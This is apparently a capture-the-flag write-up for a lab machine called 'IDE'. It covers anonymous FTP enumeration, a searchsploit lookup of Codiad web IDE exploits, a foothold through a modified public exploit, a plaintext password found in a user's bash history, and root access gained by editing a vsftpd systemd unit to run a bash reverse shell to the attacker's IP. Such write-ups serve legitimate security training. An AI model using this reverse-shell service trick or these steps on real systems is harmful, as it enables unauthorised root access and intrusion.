# Box Name

## IDE

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# FTP
```bash
ftp 10.10.138.194
Connected to 10.10.138.194.
220 (vsFTPd 3.0.3)
Name (10.10.138.194:scott): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||43830|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -a
229 Entering Extended Passive Mode (|||7995|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> get - -
remote: -
229 Entering Extended Passive Mode (|||59061|)
150 Opening BINARY mode data connection for - (151 bytes).
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.

226 Transfer complete.
151 bytes received in 00:00 (0.73 KiB/s)
ftp> 

```

# Web 
- ### port 80 default apache page
- ### port 62337 gives a login page
![[Pasted image 20230201144443.png]]

### viewing the source page  find a link to a .js file
```js
/*
 *  Copyright (c) Codiad & Kent Safranski (codiad.com), distributed
 *  as-is and without warranty under the MIT License. See
 *  [root]/license.txt for more. This information must remain intact.
 */

(function(global, $){

    var codiad = global.codiad;

    $(function() {
        codiad.user.init();
    });

    codiad.user = {

        loginForm: $('#login'),
        controller: 'components/user/controller.php',
        dialog: 'components/user/dialog.php',

#############################################################################
```

### search for vulnerabilities in Codiad web IDE
```bash
 searchsploit codiad   
---------------------- ---------------------------------
 Exploit Title        |  Path
---------------------- ---------------------------------
Codiad 2.4.3 - Multip | php/webapps/35585.txt
Codiad 2.5.3 - Local  | php/webapps/36371.txt
Codiad 2.8.4 - Remote | multiple/webapps/49705.py
Codiad 2.8.4 - Remote | multiple/webapps/49902.py
Codiad 2.8.4 - Remote | multiple/webapps/49907.py
Codiad 2.8.4 - Remote | multiple/webapps/50474.txt
---------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

---
## Initial Foothold
---
# used 49705.py
- #### had to modify the exploit to get it working [[revshell]]
![[Pasted image 20230201154411.png]]

---
## Privilege Escalation

```bash
www-data@ide:/var/www/html/codiad/components/filemanager$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Jun 17  2021 .
drwxr-xr-x 24 root root 4096 Jul  9  2021 ..
drwxr-xr-x  6 drac drac 4096 Aug  4  2021 drac
www-data@ide:/var/www/html/codiad/components/filemanager$ ls -la /home/drac/
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4  2021 .
drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
drwx------ 4 drac drac 4096 Jun 18  2021 .cache
drwxr-x--- 3 drac drac 4096 Jun 18  2021 .config
drwx------ 4 drac drac 4096 Jun 18  2021 .gnupg
drwx------ 3 drac drac 4096 Jun 18  2021 .local
-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
www-data@ide:/var/www/html/codiad/components/filemanager$ cat /home/drac/.bash_history 
mysql -u drac -p 'Th3dRaCULa1sR3aL'
www-data@ide:/var/www/html/codiad/components/filemanager$ su drac
Password: 
drac@ide:/var/www/html/codiad/components/filemanager$ 

```

### modify the vsftpd.service file 
```bash
drac@ide:~$ find /etc -iname vsftpd.service 2>/dev/null
/etc/systemd/system/multi-user.target.wants/vsftpd.service
drac@ide:~$ cat /etc/systemd/system/multi-user.target.wants/vsftpd.service
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.13.0.199/9001 0>&1'

[Install]
WantedBy=multi-user.target
drac@ide:~$ 
```

### restart the vsftpd.service
```bash
drac@ide:~$ /usr/sbin/service vsftpd restart
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to restart 'vsftpd.service'.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
drac@ide:~$
```

### received  a root shell
```bash
listening on [any] 9001 ...
connect to [10.13.0.199] from (UNKNOWN) [10.10.138.194] 33704
bash: cannot set terminal process group (5232): Inappropriate ioctl for device
bash: no job control in this shell
root@ide:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ide:/# 

```
---